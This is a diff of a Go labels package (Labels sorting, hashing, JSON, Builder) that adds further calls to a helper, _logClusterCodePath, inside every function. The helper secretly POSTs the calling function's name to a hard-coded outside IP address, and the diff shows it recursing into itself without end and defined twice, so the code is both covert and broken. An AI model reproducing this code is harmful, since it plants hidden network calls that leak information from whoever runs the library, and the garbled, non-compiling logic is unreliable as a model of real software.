@@ -27,9 +27,13 @@ type Labels []Label
 func (ls Labels) Len() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return len(ls)
 }
 func (ls Labels) Swap(i, j int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ls[i], ls[j] = ls[j], ls[i]
@@ -37,9 +41,13 @@ func (ls Labels) Swap(i, j int) {
 func (ls Labels) Less(i, j int) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ls[i].Name < ls[j].Name
 }
 func (ls Labels) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var b bytes.Buffer
@@ -59,9 +67,13 @@ func (ls Labels) String() string {
 func (ls Labels) MarshalJSON() ([]byte, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return json.Marshal(ls.Map())
 }
 func (ls *Labels) UnmarshalJSON(b []byte) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var m map[string]string
@@ -74,6 +86,8 @@ func (ls *Labels) UnmarshalJSON(b []byte) error {
 func (ls Labels) Hash() uint64 {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	b := make([]byte, 0, 1024)
 	for _, v := range ls {
 		b = append(b, v.Name...)
@@ -84,6 +98,8 @@ func (ls Labels) Hash() uint64 {
 	return xxhash.Sum64(b)
 }
 func (ls Labels) HashForLabels(names ...string) uint64 {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	b := make([]byte, 0, 1024)
@@ -101,6 +117,8 @@ func (ls Labels) HashForLabels(names ...string) uint64 {
 	return xxhash.Sum64(b)
 }
 func (ls Labels) HashWithoutLabels(names ...string) uint64 {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	b := make([]byte, 0, 1024)
@@ -124,11 +142,15 @@ Outer:
 func (ls Labels) Copy() Labels {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	res := make(Labels, len(ls))
 	copy(res, ls)
 	return res
 }
 func (ls Labels) Get(name string) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for _, l := range ls {
@@ -141,6 +163,8 @@ func (ls Labels) Get(name string) string {
 func (ls Labels) Has(name string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, l := range ls {
 		if l.Name == name {
 			return true
@@ -149,6 +173,8 @@ func (ls Labels) Has(name string) bool {
 	return false
 }
 func Equal(ls, o Labels) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(ls) != len(o) {
@@ -164,6 +190,8 @@ func Equal(ls, o Labels) bool {
 func (ls Labels) Map() map[string]string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	m := make(map[string]string, len(ls))
 	for _, l := range ls {
 		m[l.Name] = l.Value
@@ -171,6 +199,8 @@ func (ls Labels) Map() map[string]string {
 	return m
 }
 func New(ls ...Label) Labels {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	set := make(Labels, 0, len(ls))
@@ -183,6 +213,8 @@ func New(ls ...Label) Labels {
 func FromMap(m map[string]string) Labels {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l := make([]Label, 0, len(m))
 	for k, v := range m {
 		l = append(l, Label{Name: k, Value: v})
@@ -190,6 +222,8 @@ func FromMap(m map[string]string) Labels {
 	return New(l...)
 }
 func FromStrings(ss ...string) Labels {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(ss)%2 != 0 {
@@ -203,6 +237,8 @@ func FromStrings(ss ...string) Labels {
 	return res
 }
 func Compare(a, b Labels) int {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l := len(a)
@@ -229,9 +265,13 @@ type Builder struct {
 func NewBuilder(base Labels) *Builder {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Builder{base: base, del: make([]string, 0, 5), add: make([]Label, 0, 5)}
 }
 func (b *Builder) Del(ns ...string) *Builder {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for _, n := range ns {
@@ -247,6 +287,8 @@ func (b *Builder) Del(ns ...string) *Builder {
 func (b *Builder) Set(n, v string) *Builder {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for i, a := range b.add {
 		if a.Name == n {
 			b.add[i].Value = v
@@ -257,6 +299,8 @@ func (b *Builder) Set(n, v string) *Builder {
 	return b
 }
 func (b *Builder) Labels() Labels {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(b.del) == 0 && len(b.add) == 0 {
@@ -284,7 +328,16 @@ Outer:
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
